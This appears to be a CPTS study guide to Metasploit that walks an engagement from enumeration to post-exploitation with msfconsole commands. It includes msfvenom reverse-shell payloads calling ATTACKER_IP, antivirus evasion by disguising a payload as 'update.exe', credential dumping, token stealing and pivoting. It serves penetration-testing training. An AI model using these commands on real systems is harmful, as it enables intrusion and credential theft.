CPTS · Metasploit Framework

Metasploit.

How a Metasploit engagement fits together: enumerate, prepare, exploit, escalate, then post-exploitation, and round again for the next target. Open any node for what it means and the msfconsole commands behind it, or walk the module workflow step by step. Use it only against systems you are authorised to test.

Full command reference on the CPTS page

Module workflow

The path through the map from finding a module to running it: 6 msfconsole steps. Each step is marked on the map.

  1. 1Search for a module

    Search the module library for the vulnerability you found.

    msf6 > search ms17_010
msf6 > search eternalromance type:exploit
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
msf6 > search cve:2009 type:exploit platform:-linux
  2. 2Use it

    Select the module by its index number, and read info.

    msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > info
  3. 3Set options

    show options, then set each required option, such as RHOSTS.

    msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS TARGET
msf6 exploit(...) > setg RHOSTS TARGET
msf6 exploit(...) > setg LHOST ATTACKER_IP
  4. 4Set the payload

    show payloads, then set one that fits your listener and the target's architecture.

    msf6 exploit(...) > show payloads
msf6 exploit(...) > grep meterpreter grep reverse_tcp show payloads
msf6 exploit(...) > set payload 15
msf6 exploit(...) > set LHOST ATTACKER_IP
  5. 5Set the target

    show targets, then set the one matching the operating system and version.

    msf6 exploit(...) > show targets
msf6 exploit(...) > set target <index no.>
  6. 6Run

    check if the module supports it, then run.

    msf6 exploit(windows/smb/ms17_010_psexec) > check
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Command shell session 1 opened
C:\Windows\system32> whoami
nt authority\system

Engagement structure

  1. 01

    Enumeration

    Find out exactly what is running, and which version, before you reach for a module.

    • Workspace & database

      msfconsole backs onto a PostgreSQL database that keeps your results, so hosts, services, credentials and loot survive across a long engagement and feed straight into modules. Start it once with msfdb init and check it with db_status. help database lists the commands.

      sudo msfdb init
msfconsole -q
msf6 > db_status
msf6 > help database
      • Workspaces

        Workspaces are folders for the database: keep each target, subnet or client apart. workspace lists them (* marks the current one), -a adds and switches, -d deletes, workspace <name> switches.

        msf6 > workspace
msf6 > workspace -a Target_1
msf6 > workspace Target_1
      • Import & scan

        Pull scan results into the workspace, or scan from the console so the output is recorded. db_import reads a file (Nmap .xml is preferred); db_nmap runs Nmap and stores it. hosts and services then list what was found.

        msf6 > db_import Target.xml
msf6 > db_nmap -sV -sS TARGET
msf6 > hosts
msf6 > services
      • Hosts & services

        The hosts and services tables fill automatically from scans and interactions, and take manual entries too. Both filter and reshape their columns; -R sets RHOSTS straight from the rows you have selected, so the database drives the next module.

        msf6 > hosts -R
msf6 > services -p 445 -R
msf6 > hosts -S Windows
      • Credentials & loot

        creds lists the usernames, passwords and hashes gathered, with add to record your own and -o to export in John or hashcat format. loot holds dumped files, such as SAM hashes, passwd and shadow.

        msf6 > creds
msf6 > creds add user:admin ntlm:<hash>
msf6 > loot
      • Export (backup)

        db_export writes the workspace to a file (xml or pwdump), so a PostgreSQL mishap does not cost your findings; db_import reads it back.

        msf6 > db_export -f xml backup.xml
    • Service validation

      Confirm each service and its version. Passive sources first, then active scanning; Metasploit can store the results in its database so later modules pick them up.

      • Passive scanning

        Learn about the target without sending it anything unusual.

        • OSINT

          Public sources: the organisation's sites, job adverts that name their stack, code repositories, certificate transparency logs.

        • Interacting with services legitimately

          Use the service as an ordinary visitor would: browse the site, read banners and error pages, note versions the service volunteers.

        • whois / DNS records

          Registrant and netblock owners from whois; hosts, mail servers and subdomains from DNS records.

      • Active scanning

        Probe the target directly to fingerprint services and versions.

        • Nmap / Nessus / Nexpose scans

          Port and version scans. Run Nmap from inside msfconsole with db_nmap and the hosts and services land in the workspace database.

          msf6 > workspace -a engagement
msf6 > db_nmap -sV -p- TARGET
msf6 > services
        • Web service identification tools

          Fingerprint web servers, frameworks and CMS versions (headers, default files, favicons).

        • Built-with identification tools

          Technology profilers that list the libraries, plugins and hosting behind a site.

    • Vulnerability research

      Match each product and version to known vulnerabilities, then find the module that covers it. The research sources feed the first two steps of the module workflow: search, then use.

      • VulnDB (GUI)

        Vulnerability database: look up the product and version for known issues.

      • Rapid7 (GUI)

        Rapid7's vulnerability and module database: each entry names the Metasploit module that covers it.

      • SearchSploit (CLI)

        Offline search of the Exploit-DB archive from the terminal.

        searchsploit <product> <version>
      • Google Dorking (GUI)

        Targeted search operators to find advisories, write-ups and proof-of-concept code for the version you found.

      • Module anatomy

        Every module path reads <no.> <type>/<os>/<service>/<name>, e.g. 794 exploit/windows/ftp/scriptftp_list. No. is the index from your last search (use it instead of typing the path); type is what the module does; os is the target platform and architecture; service is the vulnerable service (or a general action like gather for a collection module); name is the specific action.

      • Module types

        The type is the first split between modules. Only Auxiliary, Exploit and Post are interactable with use; the rest support those. Auxiliary: scanning, fuzzing, sniffing, admin. Encoders: keep a payload intact to its destination. Exploits: abuse a vulnerability to deliver a payload. NOPs: keep payload sizes consistent across attempts. Payloads: the code that runs on the target and calls back. Plugins: extra scripts loaded into the console. Post: collect, pivot and escalate once you hold a session.

      • 1search [vuln. name]

        Search the module library. Bare text matches names and descriptions; keywords narrow it, and a leading - excludes. Useful keywords: cve:, type: (exploit/auxiliary/post/payload/encoder/nop/evasion), platform:, port:, rank: (e.g. excellent, or gte400), name:, author:, cve:, edb:, check: (has a check method). -S filters by regex, -s <column> sorts, -u uses the module if there is exactly one result.

        msf6 > search ms17_010
msf6 > search eternalromance type:exploit
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
msf6 > search cve:2009 type:exploit platform:-linux
      • 2use [index no.]

        Select a module by its index number from the last search, or by its full path. info prints the targets, required options, references, rank and whether a check method is supported, so read it before firing. The prompt changes to name the module you are in.

        msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > info

  2. 02

    Preparation

    Make sure the module is the right one, and that it will work, before it touches the target.

    • Code auditing

      Read the module or exploit source. Know what it sends, what it changes on the target, and whether it can crash the service.

    • Dependency check

      Confirm the module's requirements: the exact target version, the gems or libraries it needs, and any service state it assumes.

    • Importing custom modules

      A module not in the official release goes in by hand. Find Metasploit-format exploits on Exploit-DB (filter by the Metasploit Framework tag) or with searchsploit; the .rb files marked (Metasploit) are the ones msfconsole can run, so not every .rb qualifies. Drop it under ~/.msf4/modules (or /usr/share/metasploit-framework/modules) in the matching folder structure, making the folders if they are missing. Name it snake_case with underscores, not dashes, or it errors. Then reload_all, or loadpath <dir>, and search or use it.

      searchsploit -t nagios3 --exclude=".py"
cp 9861.rb ~/.msf4/modules/exploits/unix/webapp/nagios3_command_injection.rb
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection
    • Porting & writing modules

      To turn a Python or PHP exploit into a module, or write one from scratch, you work in Ruby (hard tabs). Do not start blank: copy an existing module from the same category and reuse it as boilerplate. The include lines at the top are mixins, shared classes such as Msf::Exploit::Remote::HttpClient that hand you ready methods; pick the ones your exploit needs from the Metasploit documentation. The initialize block holds the name, description, author, references (CVE), platform, arch and targets; register_options declares what the user sets, like RHOSTS and TARGETURI. Keep custom modules tidy so you and the next tester can find them.

    • Plugins

      Plugins pull an outside tool into msfconsole so its work lands in the same database and you stop juggling separate software. Nessus, Nexpose, Nmap, Mimikatz and others ship ready to load. load <name> starts one and adds its commands to the console. The .rb files live in /usr/share/metasploit-framework/plugins, so a custom plugin just drops in there. Mixins are the Ruby side of the same idea, shared code the framework is built from. Worth knowing the name, nothing to set.

      msf6 > load nessus
msf6 > nessus_help
sudo cp pentest.rb /usr/share/metasploit-framework/plugins/
msf6 > load pentest

  3. 03

    Exploitation

    Set the module's parameters, then run it.

    • Run module locally

      Try the module against a lab copy of the target first, where a crash costs nothing.

    • Set parameters

      Every module needs three things set: its options, a payload, and a target.

      • 3Options (show options)

        The module's settings, shown by show options (or options). Everything with Yes under the Required column must be set before it will run. set applies to this module only; setg sets a global value kept across modules until you restart, handy for RHOSTS and LHOST while you stay on one target. The payload has its own options block (LHOST, LPORT).

        msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS TARGET
msf6 exploit(...) > setg RHOSTS TARGET
msf6 exploit(...) > setg LHOST ATTACKER_IP
        • URI

          The path to the vulnerable application on a web server (often TARGETURI).

        • Proxies

          Send the module's traffic through a proxy chain.

        • RHOST / RPORT

          The target address (RHOSTS) and service port (RPORT).

        • Usernames

          A single username or a file of them, for modules that log in.

        • Passwords

          A single password or a file of them.

        • Dictionaries

          Wordlists for login and brute-force modules (USER_FILE, PASS_FILE, USERPASS_FILE).

        • Session

          An existing session to run through: post and local modules act on a session you already hold.

      • 4Payloads (show payloads)

        The code sent with the exploit that runs on the target, usually to return a shell: the exploit's job is to land it, the payload's job is to connect back. Run from inside an exploit module, show payloads lists only the ones that fit (msfconsole has already filtered to the target OS and arch), and set payload <no.> selects one, which adds its own options (LHOST, LPORT). The list is long, so filter with grep; ifconfig prints your LHOST without leaving the console.

        msf6 exploit(...) > show payloads
msf6 exploit(...) > grep meterpreter grep reverse_tcp show payloads
msf6 exploit(...) > set payload 15
msf6 exploit(...) > set LHOST ATTACKER_IP
        • Singles, stagers, stages

          Three payload builds. A single carries the exploit and the whole task in one; self-contained and stable, but large, and some exploits cannot fit it. A staged payload splits the work: a small, reliable stager (Stage0) runs first and opens the connection back (reverse_tcp, reverse_https, bind_tcp), then pulls a larger stage (Stage1) with no size limit, like Meterpreter or VNC. A / in the payload name marks a staged pair: windows/shell_bind_tcp is a single, windows/shell/bind_tcp is stager + stage. Metasploit picks the stager for you.

        • Meterpreter

          The multi-purpose stage. Injected as a DLL and run entirely in memory, leaving nothing on disk, so it is hard to spot with ordinary forensics; extensions load and unload on the fly. Its own prompt takes Linux-style commands, not Windows ones: getuid, not whoami. From it: hashdump, screenshot, keyscan, getsystem, migrate, and shell to drop into a real cmd.exe on the host.

        • Shell binds

          The target opens a listening port and you connect in. Needs that port reachable from you, so it fails behind inbound filtering; reverse shells are usually preferred.

        • Reverse shells

          The target dials back to your listener (LHOST/LPORT). It rides outbound traffic, which firewalls trust more than inbound, so it works through most NAT and filtering. Still watched, so tread carefully.

        • EXE

          A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler. Beyond Metasploit's own payloads, frameworks like Empire and Cobalt Strike cover the same ground on real engagements.

        • msfvenom (standalone payloads)

          msfvenom builds a payload as a standalone file, outside an exploit, for when you deliver it yourself: an upload, a writable share, a phishing lure. It is msfpayload and msfencode in one. Pick the payload with -p, the output format with -f (exe, aspx, elf, raw, or a scripting language), set LHOST and LPORT, and write it with -o. Catch the callback with exploit/multi/handler set to the same payload, LHOST and LPORT.

          msfvenom -l payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f aspx -o shell.aspx
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
        • Encoders

          Rework a payload's bytes to make it compatible: fit a processor architecture (x86, x64, sparc, ppc, mips) and strip bad characters, such as the null byte, that would break the exploit. show encoders inside a module lists only the ones that fit the current payload. x86/shikata_ga_nai (a polymorphic XOR scheme) was once the go-to for evasion, but modern detection has caught up: encoding alone, even over many -i iterations, rarely gets a payload past antivirus now, so treat encoders as a compatibility tool, not an evasion one. Before 2015 this was msfpayload | msfencode; both are folded into msfvenom. Check a build with msf-virustotal (needs a VirusTotal API key).

          msf6 exploit(...) > show encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
msf-virustotal -k <API key> -f payload.exe
        • AV & IDS/IPS evasion

          Defences split in two: endpoint protection (antivirus on the host) and perimeter protection (firewall, IDS/IPS at the network edge, often with a DMZ between inside and outside). Signature detection matches known byte patterns; heuristic and behavioural detection flag anything that strays from normal, so a plain payload, or even the callback itself, can trip an alarm. msfconsole v6 tunnels Meterpreter over AES, which handles most network inspection, but the file still sits on disk before it runs and can be fingerprinted there, so encoding alone will not hide it. Stronger moves: embed the payload in a real executable with a template (-x) and run it in a separate thread (-k) so the host program still opens normally, or wrap the file in a password-protected archive the scanner cannot read (it may still flag the archive as unscannable). Packers (UPX, Themida and others) compress and reshape the executable for another layer. For exploit code, randomise buffers and avoid obvious NOP sleds, which IDS/IPS watch for. Authorised testing only, and test in a lab first: you may get one attempt on the client.

          msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -x template.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o update.exe
      • 5Targets (show targets)

        The operating system and version the exploit is tuned for. Many modules default to automatic; pick one explicitly when you know the target.

        msf6 exploit(...) > show targets
msf6 exploit(...) > set target <index no.>
        • Linux

          Linux targets, often split by distribution or architecture.

        • Windows

          Windows targets, often split by version and service pack.

        • macOS

          macOS targets.

        • Others

          Everything else the module supports: BSD, appliances, embedded firmware.

    • 6Run

      check first where the module supports it, then fire. run reports the handler starting, confirms the target is vulnerable, and opens a session when it works. Drop to a shell from a Meterpreter session, or use run -j to run it as a background job. A failed exploit means the module did not work, not that the vulnerability is gone. Many need tuning to the target, so treat the framework as a tool that backs up your manual skills, not one that replaces them.

      msf6 exploit(windows/smb/ms17_010_psexec) > check
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Command shell session 1 opened
C:\Windows\system32> whoami
nt authority\system
    • Sessions & jobs

      A session is your control channel to one compromised host, and msfconsole holds several at once. Background the current one with background (or Ctrl+Z) and the connection stays up while you load another module, then sessions -i <no.> drops you back in. Point a post or local module at a backgrounded session with set SESSION <no.>. A job is a module running in the background, such as a handler holding a port. exploit -j starts one, jobs -l lists them, and kill <no.> or jobs -K frees the port without tearing down your sessions.

      meterpreter > background
msf6 > sessions -l
msf6 > sessions -i 1
msf6 > exploit -j
msf6 > jobs -l
msf6 > kill 0
  4. 04

    Privilege escalation

    From the foothold, work up to the highest privilege on the host.

    • Vulnerability research

      Enumerate the host from the session and map it to local exploits, which run as local modules against that session.

      meterpreter > run post/multi/recon/local_exploit_suggester
msf6 > use exploit/windows/local/<suggested>
msf6 exploit(...) > set SESSION 1
    • Credential gathering

      Passwords and hashes found on the host can lead to a more privileged account.

    • Token impersonation

      On Windows, a process may hold access tokens of other, more privileged users that the session can take on.

  5. 05

    Post-exploitation

    Use the access you have: reach further, gather what the engagement asks for, and leave nothing behind.

    • Meterpreter

      Meterpreter is the post-exploitation shell you get from a Meterpreter payload. It lives in memory, writes nothing to disk, injects into a process that is already running rather than starting its own, and talks back over AES, so it leaves little for forensics to find. It works like a normal shell with extra built-in commands, grouped under help (core, filesystem, networking, system, user interface, webcam, privilege). From one session you can enumerate the host, move process, escalate, dump credentials and pivot without reaching for another tool.

      meterpreter > help
meterpreter > getuid
meterpreter > sysinfo
      • Look around

        Find out who you are and what is running before you act. getuid is who the session runs as, sysinfo is the OS and domain, ps is the process list with each one's user and architecture.

        meterpreter > getuid
meterpreter > sysinfo
meterpreter > ps
      • Move process & steal tokens

        migrate moves the session into another, more stable process, which also shifts the user you run as. On Windows, steal_token <pid> takes the access token of a process owned by a more privileged user, so getuid then shows that account.

        meterpreter > ps
meterpreter > migrate <pid>
meterpreter > steal_token <pid>
      • Escalate

        getsystem tries the built-in routes to SYSTEM. If it fails, background the session and run the local exploit suggester to map the host to local exploits, then run one against the SESSION.

        meterpreter > getsystem
meterpreter > run post/multi/recon/local_exploit_suggester
      • Dump credentials

        As SYSTEM, pull the hashes. hashdump reads the local SAM; load kiwi brings in Mimikatz; lsa_dump_sam and lsa_dump_secrets pull the SAM and the LSA secrets (service accounts, cached logins). Feed what you get to cracking or pass-the-hash.

        meterpreter > hashdump
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
      • Drop to a shell

        shell opens a native cmd.exe or /bin/sh on the host, at the same privilege as the session. background (or bg) keeps the session alive and returns you to msfconsole.

        meterpreter > shell
meterpreter > background
    • Pivoting to other systems

      Route traffic through the session to networks only the compromised host can reach.

      meterpreter > run autoroute -s 172.16.5.0/24
    • Credential gathering

      Collect credentials for lateral movement. Record where each one came from.

    • Data exfiltration

      Show impact by retrieving the data the scope names, and only that.

    • Cleanup

      Remove every file, account, service and route you added, and log what you removed, so the client is left as you found it.
